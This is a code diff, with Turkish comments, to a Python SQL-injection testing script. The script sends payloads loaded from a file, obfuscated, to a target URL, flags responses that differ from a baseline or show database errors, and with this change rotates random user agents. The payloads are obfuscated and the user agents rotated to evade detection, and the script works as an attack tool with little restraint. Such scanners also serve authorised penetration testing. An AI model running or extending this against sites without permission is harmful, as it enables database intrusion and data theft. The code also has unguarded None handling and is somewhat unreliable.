@@ -4,11 +4,10 @@ import argparse
 import logging
 from concurrent.futures import ThreadPoolExecutor
 import json
+import random
 
 # Loglama yapılandırması
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
 
 def load_config(config_path):
     # Konfigürasyon dosyasını yükler.
@@ -41,6 +40,17 @@ def load_error_messages(file_path):
         logging.error(f"Hata mesajları dosyası yüklenirken hata: {e}")
         return []
 
+def load_user_agents(file_path):
+    # Belirtilen dosyadan kullanıcı ajanlarını yükler.
+    try:
+        with open(file_path, 'r') as file:
+            user_agents = [line.strip() for line in file.readlines()]
+        logging.info("Kullanıcı ajanları başarıyla yüklendi.")
+        return user_agents
+    except Exception as e:
+        logging.error(f"Kullanıcı ajanları dosyası yüklenirken hata: {e}")
+        return []
+
 def obfuscate_payloads(payload):
     # Payload'ları çeşitli yollarla gizler.
     obfuscations = [
@@ -65,33 +75,41 @@ def get_response(url, headers, method='GET', data=None):
             response = requests.get(url, headers=headers, timeout=5)
         elif method == 'POST':
             response = requests.post(url, headers=headers, data=data, timeout=5)
-        return response.text
+        return response
     except requests.Timeout:
         logging.error("Zaman aşımına uğradı.")
-        return ""
+        return None
     except requests.ConnectionError:
         logging.error("Bağlantı hatası.")
-        return ""
+        return None
     except requests.RequestException as e:
         logging.error(f"İstek sırasında hata: {e}")
-        return ""
+        return None
 
 def check_response(normal_response, response, payload, error_messages):
     # Yanıtı normal yanıt ile karşılaştırır ve hata mesajlarını kontrol eder.
-    response_different = response != normal_response
-    error_detected = any(error in response for error in error_messages)
+    response_different = response.text != normal_response
+    error_detected = any(error in response.text for error in error_messages)
+    
+    # Yanıt süresi, durum kodu ve yanıt boyutunu kontrol et
+    response_time = response.elapsed.total_seconds() if response else None
+    response_code = response.status_code if response else None
+    response_size = len(response.text) if response else None
 
     # Her iki durumdan birinin sağlanması yeterli
     if response_different or error_detected:
         logging.warning(f"SQL Enjeksiyonu Başarılı! Payload: {payload}")
+        logging.info(f"Yanıt Süresi: {response_time}s, HTTP Durum Kodu: {response_code}, Yanıt Boyutu: {response_size} byte")
         return True  # SQL injection detected
     
     return False
 
-def test_sql_injection(url, payloads, error_messages, is_post=False, data=None):
+def test_sql_injection(url, payloads, error_messages, user_agents, is_post=False, data=None):
     # SQL injection açığını test eden fonksiyonu.
-    headers = {'User-Agent': USER_AGENT}
-    normal_response_content = get_response(url, headers, method='POST' if is_post else 'GET', data=data)
+    random_user_agent = random.choice(user_agents) if user_agents else {}
+    headers = {'User-Agent': random_user_agent}  # Rastgele User-Agent ekle
+    normal_response = get_response(url, headers, method='POST' if is_post else 'GET', data=data)
+    normal_response_content = normal_response.text if normal_response else ""
     logging.info("Normal yanıt alındı ve referans olarak kaydedildi.")
 
     with ThreadPoolExecutor(max_workers=5) as executor:
@@ -112,6 +130,7 @@ def test_sql_injection(url, payloads, error_messages, is_post=False, data=None):
                 logging.info(f"SQL injection testi başarılı! Payload: {payload}")
             else:
                 logging.info(f"SQL injection testi başarısız! Payload: {payload}")  
+
 def main():
     # Ana fonksiyon
     parser = argparse.ArgumentParser(description='SQL Injection Tester')
@@ -125,16 +144,17 @@ def main():
     
     payload_file_path = config.get('payloads_file', '/home/kullanıcıadı/Dosyayolu/sorgu.txt')
     error_file_path = config.get('errors_file', '/home/kullanıcıadı/Dosyayolu/errors.txt')
+    user_agent_file_path = '/home/kullanıcıadı/Dosyayolu/user-agents.txt'
 
     payloads = load_payloads(payload_file_path)
     error_messages = load_error_messages(error_file_path)
+    user_agents = load_user_agents(user_agent_file_path)
 
     post_data = {}
     if args.data:
         post_data = dict(item.split('=') for item in args.data.split('&'))
 
-    test_sql_injection(args.url, payloads, error_messages, is_post=args.post, data=post_data)
+    test_sql_injection(args.url, payloads, error_messages, user_agents, is_post=args.post, data=post_data)
 
 if __name__ == "__main__":
     main()
-
